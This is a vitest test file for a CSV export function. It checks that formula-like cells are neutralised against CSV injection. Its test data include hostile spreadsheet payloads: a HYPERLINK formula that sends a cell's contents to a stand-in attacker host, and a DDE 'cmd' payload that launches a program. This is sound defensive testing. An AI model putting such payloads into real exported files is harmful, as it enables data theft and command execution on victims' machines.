import { describe, expect, it } from 'vitest';
import { toCsv } from './files';

/** The cells of the first data row, as a spreadsheet reads them: quotes removed and doubled quotes undone. */
function firstRow(csv: string): string[] {
  const row = csv.slice(csv.indexOf('\r\n') + 2);
  const out: string[] = [];
  for (let i = 0; i <= row.length;) {
    if (row[i] === '"') {
      let v = '';
      for (i++; i < row.length; i++) {
        if (row[i] === '"' && row[i + 1] === '"') { v += '"'; i++; } else if (row[i] === '"') { i++; break; } else v += row[i];
      }
      out.push(v);
      i++; // the comma
    } else {
      const end = row.indexOf(',', i) < 0 ? row.length : row.indexOf(',', i);
      out.push(row.slice(i, end));
      i = end + 1;
    }
  }
  return out;
}

describe('CSV cells a spreadsheet could run as a formula (CSV injection)', () => {
  const risky = [
    '=1+1', '+1+1', '-1+1', '@SUM(A1:A9)', '=HYPERLINK("https://evil.example/?d="&A1,"Open")', "-2+3+cmd|' /C calc'!A0",
    ' =1+1', '\u00a0=1+1', '\u0001=1+1', '\t=1+1', '\n=1+1', '\r=1+1', '\tplain text', '\rplain text', '\uff1d1+1', '\uff0b1+1', '\uff0d1+1', '\uff20SUM(A1)'
  ];

  it('start with an apostrophe, so they open as text, and keep their content', () => {
    const csv = toCsv(risky.map((_, i) => `c${i}`), [risky]);
    expect(firstRow(csv)).toEqual(risky.map((v) => `'${v}`));
  });

  it('leave numbers, dashes and ordinary text as they were', () => {
    const safe = ['-0.5', '+3', '1e-7', '-1.20', ' -5 ', '-', '--', '', 'DB-GF1', 'a=b', '4 mm²', '—', '\u22125', 'Circuit 1, spare'];
    expect(firstRow(toCsv(safe.map((_, i) => `c${i}`), [safe]))).toEqual(safe);
    expect(toCsv(['a', 'b', 'c'], [[-5, -0.25, 0]])).toBe('\uFEFFa,b,c\r\n-5,-0.25,0');
    expect(toCsv(['a', 'b', 'c'], [['=1+1', -5, 'say "hi", ok']])).toBe('\uFEFFa,b,c\r\n\'=1+1,-5,"say ""hi"", ok"');
  });

  it('are not slipped into a new cell by a semicolon or tab (the cell separator in some spreadsheets)', () => {
    expect(toCsv(['a', 'b'], [['x;=1+1', 'y\t=1+1']])).toBe('\uFEFFa,b\r\n"x;=1+1","y\t=1+1"');
  });
});
